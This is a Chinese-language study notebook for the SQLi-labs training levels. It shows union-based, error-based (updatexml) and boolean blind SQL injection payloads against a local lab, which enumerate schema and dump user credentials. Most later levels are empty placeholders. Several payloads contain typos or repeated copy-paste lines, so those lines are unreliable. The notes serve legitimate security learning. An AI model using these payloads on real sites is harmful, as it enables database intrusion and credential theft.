# 相关学习资料

https://blog.csdn.net/likinguuu/article/details/136520040

https://blog.csdn.net/kknifek/article/details/141199152

# Less-1

1. 确定攻击点 确定网站可以注入的参数 比如：?id= ?ID= ?a= ?sd=

2. 判断闭合方式 ' --+

3. 判断字段列数 order by（页面正常 说明存在第几列）

   ```
   ?id=-1' order by 3 -- #
   ```

4. [联合查询](https://so.csdn.net/so/search?q=联合查询&spm=1001.2101.3001.7020) 查当前数据库名database()，数据库版本version()，数据库用户user(),表内数据

   ```
   ?id=-1' union select 1,version(),user() -- #
   ?id=-1' union select 1,database(),user() -- #
   ```

   上面已经查出3列，那么联合查询3列，[页面显示](https://so.csdn.net/so/search?q=页面显示&spm=1001.2101.3001.7020)的是id=1的数据，没有显示我们联合查询的数据，把人家前面查询的id的数据改成不存在的，比如-1，此时页面上出现了我们联合查询的回显点![image-20250307122604188](https://gitee.com/PUqicnda/img/raw/master/20250307122604244.png)

   ![image-20250307122717925](https://gitee.com/PUqicnda/img/raw/master/20250307122717970.png)

   grop_concat()函数：是将里面的多个行整合为一行即一个字符串，information_schema[见这里](http://t.csdnimg.cn/i8dik)，简单看一下column_name、table_name、table_schema对选取条件有帮助的就行。

   ```
   ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- #获取表名
   ```

   ![image-20250307122753776](https://gitee.com/PUqicnda/img/raw/master/20250307122753822.png)

   ```
   ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()-- #获取全部列名
   ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'-- #获取users列名(注意，表名要用引号引起来）,同理获得其他表的列名
   ```

   ![image-20250307145226475](https://gitee.com/PUqicnda/img/raw/master/20250307145226523.png)

   ![image-20250307123005288](https://gitee.com/PUqicnda/img/raw/master/20250307123005348.png)

   ```
   ?id=-1' union select 1,group_concat(id,username,0x7e,password),3 from users-- #获取数据
   ?id=-1' union select 1,group_concat(id,0x7e,email_id),3 from emails-- #获取数据
   ?id=-1' union select 1,group_concat(id,referer,ip_address),3 from referers  -- #获取数据
   ?id=-1' union select 1,group_concat(id,uagent,ip_address,username),3 from uagents-- #获取数据
   ////不知道为什么后两条数据获取不了
   ```
   
   ![image-20250307123608539](https://gitee.com/PUqicnda/img/raw/master/20250307123608597.png)

![image-20250307123707904](C:/Users/pq268/AppData/Roaming/Typora/typora-user-images/image-20250307123707904.png)



# Less-2

1. 先确定攻击点,id=1，页面正常

2. **判断闭合方式，及判断字段列数**

   ![image-20250307202047626](https://gitee.com/PUqicnda/img/raw/master/20250307202047690.png)

   判断为**数字型**

   > 判断方法：https://blog.csdn.net/chenzzhenguo/article/details/108842399
   >
   > ```
   > url地址中输入www.xxxx.com/ccc.php?id=x and 1=1
   > 页面显示正常，继续下一步
   > url地址中输入www.xxxx.com/ccc.php?id=x and 1=2
   > 页面错误，这说明存在数字型注入
   > ```
   >
   > ```
   > www.xxx.com/ccc.php?id=1’ and ‘1’='1
   > 页面正常，继续下一步
   > www.xxx.com/ccc.php?id=1’ and ‘1’='2
   > 页面报错，则说明存在字符型注入。
   > ```

3. 确认列数（同less-1）

4. 确认数据库名称

   ![image-20250307202300464](https://gitee.com/PUqicnda/img/raw/master/20250307202300525.png)

5. 查数据库security中的表名

   ```
   http://127.0.0.1/Less-2/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
   ```

   ![image-20250307202730156](https://gitee.com/PUqicnda/img/raw/master/20250307202730221.png)

6. 同less-1，查询各个表的字段名和表数据

   ![image-20250307203006481](https://gitee.com/PUqicnda/img/raw/master/20250307203006557.png)

7. 同less-1，查表数据

   ![image-20250307203404404](https://gitee.com/PUqicnda/img/raw/master/20250307203404478.png)



# Less-3

1. 确定攻击点及判断闭合方式

   攻击点:?id=1’)   --+ 来闭合

   ![image-20250307215718610](https://gitee.com/PUqicnda/img/raw/master/20250307215718713.png)

   ![image-20250307215737471](https://gitee.com/PUqicnda/img/raw/master/20250307215737540.png)

2. 判断字段数

   ![image-20250307220017858](https://gitee.com/PUqicnda/img/raw/master/20250307220017960.png)

   只有3列

3. 求数据库名和用户名

   ![image-20250307220211471](https://gitee.com/PUqicnda/img/raw/master/20250307220211582.png)

   想要union后面查询回显，1前面要加 - 。

4. 求数据库security的所有表名

   ```
   http://localhost:1234/Less-3/?id=-1%27)%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()%20--+
   ```

   ![image-20250307220559286](https://gitee.com/PUqicnda/img/raw/master/20250307220559376.png)

5. 查询列名

   ![image-20250307222234005](https://gitee.com/PUqicnda/img/raw/master/20250307222234168.png)

   ```
   http://localhost:1234/Less-3/?id=-1%27)%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27%20--+
   ```

6. 查询数据

   ![image-20250307222417791](https://gitee.com/PUqicnda/img/raw/master/20250307222417919.png)

# Less-4

1. 确认攻击点及闭合点

   攻击点:?id=1")   --+ 来闭合

   ![image-20250307223118881](https://gitee.com/PUqicnda/img/raw/master/20250307223119044.png)

   ![image-20250307223141439](https://gitee.com/PUqicnda/img/raw/master/20250307223141546.png)

2. 判断序列数

   为3列

   ![image-20250307223310893](https://gitee.com/PUqicnda/img/raw/master/20250307223311044.png)

   ![image-20250307223240720](https://gitee.com/PUqicnda/img/raw/master/20250307223240834.png)

3. 确认回显

   ![image-20250307223502760](https://gitee.com/PUqicnda/img/raw/master/20250307223502870.png)

   ![image-20250307223541438](https://gitee.com/PUqicnda/img/raw/master/20250307223541583.png)

4. 后续查询方法一样，不再赘述

# Less-5

**报错盲注**

1. ?id=1’，会报错，说明有报错注入

   ![image-20250307224138588](https://gitee.com/PUqicnda/img/raw/master/20250307224138754.png)

2. 加 --+，闭合成功

   ![image-20250307224308471](https://gitee.com/PUqicnda/img/raw/master/20250307224308587.png)

3. 使用报错函数(updatabase(1,2,3))，报错函数里面三个参数，写1,2,3占位置,我们可以操控的是第二个参数的位置
           所以第二个参数的位置换成concat()函数，这个函数也有两个参数，写两个1占位置,我们可以操控的地方也是第二个参数的位置 把第二个参数的位置换成()，里面写我们的子查询语句(select database()) 成功查出数据库名 后面查什么在子查询括号里面查就行

   ```
   ?id=1' and updataxml(1,concat(1,(select database())),3) --+
   ```

   ![image-20250307224748775](https://gitee.com/PUqicnda/img/raw/master/20250307224748893.png)

4. 查表名

   ```
   ?id=1' and updatexml(1,concat(1,(select  group_concat(table_name) from information_schema.tables where table_schema='security')),3)--+
   ```

   ![image-20250307225916495](https://gitee.com/PUqicnda/img/raw/master/20250307225916583.png)

5. 查列名

   ```
   ?id=1' and updatexml(1,concat(1,(select  group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),3)--+
   ```

   ![image-20250307230604800](https://gitee.com/PUqicnda/img/raw/master/20250307230605016.png)

6. 查表信息

   ```
   ?id=1' and updatexml(1,concat(1,(select group_concat(id,username,0x7e,password) from users)),3) --+
   ```

   ![image-20250308095017865](https://gitee.com/PUqicnda/img/raw/master/20250308095017927.png)

   1. 结果显示不全，只能通过limit一条一条查询。

      limit offset,n:   返回从offset条记录开始的n条记录。

      ```
      ?id=1' and updatexml(1,concat(1,(select concat(username,0x7e,password) from users limit 0,1)),3) --+
      ```

   ![image-20250308093832413](https://gitee.com/PUqicnda/img/raw/master/20250308094740289.png)

   

# Less-6

1. ?id=1’ 不报错，?id=1” 报错，说明有报错注入

   ![image-20250308095341408](https://gitee.com/PUqicnda/img/raw/master/20250308095341503.png)

   ![image-20250308095357537](https://gitee.com/PUqicnda/img/raw/master/20250308095357632.png)

2. 加--+ ，闭合成功

   ![image-20250308095443213](https://gitee.com/PUqicnda/img/raw/master/20250308095443273.png)

3. 同第五关的报错函数

   ```
   ?id=1" and updataxml(1,concat(1,(select database())),3) --+
   ```

   ![image-20250308101756017](https://gitee.com/PUqicnda/img/raw/master/20250308101756083.png)

4. 查表名

   ```
   ?id=1" and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='security')),3)--+
   ```

   ![image-20250308102608392](https://gitee.com/PUqicnda/img/raw/master/20250308102608505.png)

5. 查字段名

   ```
   ?id=1" and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name = 'users')),3)--+
   ```

   ![image-20250308102939599](https://gitee.com/PUqicnda/img/raw/master/20250308102939723.png)

6. 查数据

   ```
   ?id=1" and updatexml(1,concat(1,(select group_concat(id,username,0x7e,password) from users)),3) --+
   ```

   ![image-20250308103135840](https://gitee.com/PUqicnda/img/raw/master/20250308103135947.png)

   ```
   ?id=1" and updatexml(1,concat(1,(select concat(id,username,0x7e,password) from users limit 0,1)),3) --+
   ```

   ![image-20250308103444516](https://gitee.com/PUqicnda/img/raw/master/20250308103444603.png)

   ```
   ?id=1" and updatexml(1,concat(1,(select concat(id,username,0x7e,password) from users limit 2,1)),3) --+
   ```

   ![image-20250308103757902](https://gitee.com/PUqicnda/img/raw/master/20250308103757965.png)

# Less-7

**布尔盲注**

1. 第七关和第六关有所不同，输入?id=1'会报错，而id=1和id=1"时正常，说明id=1'有报错注入，这时候我们可以输入id=1') --+发现依然报错，最后尝试id=1')）--+闭合成功

   > 可尝试的有id=1’)、id=1‘))、id=1’)’、id=1’))’

   ![image-20250308104305924](https://gitee.com/PUqicnda/img/raw/master/20250308104306018.png)

2. 只有ture和false两种情况，只能先确认数据库名长度，再分别确认数据库名字中的单个字符。

   ```
   ?id=1')) and length(database())>=8 --+
   ```

   大于等于9报错，大于等于8正确，说明数据库名长度为8

   ![image-20250308105458845](https://gitee.com/PUqicnda/img/raw/master/20250308105458906.png)

3. 确定数据库名

   ascii()函数：返回字符的ascii码，substr(string,start,end)函数：截取字符串

   ```
   ?id=1')) and ascii(substr(database(),1,1))>115--+  #报错
   ?id=1')) and ascii(substr(database(),1,1))>114--+  #未报错
   ```

   ![image-20250308131341679](https://gitee.com/PUqicnda/img/raw/master/20250308131341750.png)

   ![image-20250308131928277](https://gitee.com/PUqicnda/img/raw/master/20250308131928354.png)

   对照ascii码表，得数据库名首字符为  s ，同理，其他字符求法如下

   ```
   ?id=1')) and ascii(substr(database(),2,1))>=101--+  #未报错--e
   ?id=1')) and ascii(substr(database(),3,1))>=99--+  #未报错--c
   ?id=1')) and ascii(substr(database(),4,1))>=117--+  #未报错--u
   ?id=1')) and ascii(substr(database(),2,1))>=101--+  #未报错--r
   ?id=1')) and ascii(substr(database(),2,1))>=101--+  #未报错--i
   ?id=1')) and ascii(substr(database(),2,1))>=101--+  #未报错--t
   ?id=1')) and ascii(substr(database(),2,1))>=101--+  #未报错--y
   ```

   数据库名：security

4. 判断数据库有哪些表

   ```
   id=1%27))%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1))%3E101%20--+
   ```

   

5. 1

6. 1

# Less-8

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-9

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-10

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-11

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-12

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-13

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-14

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-15

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-16

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-17

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-18

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-19

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-20

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-21

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

# Less-22

1. 1
2. 1
3. 1
4. 1
5. 1
6. 1

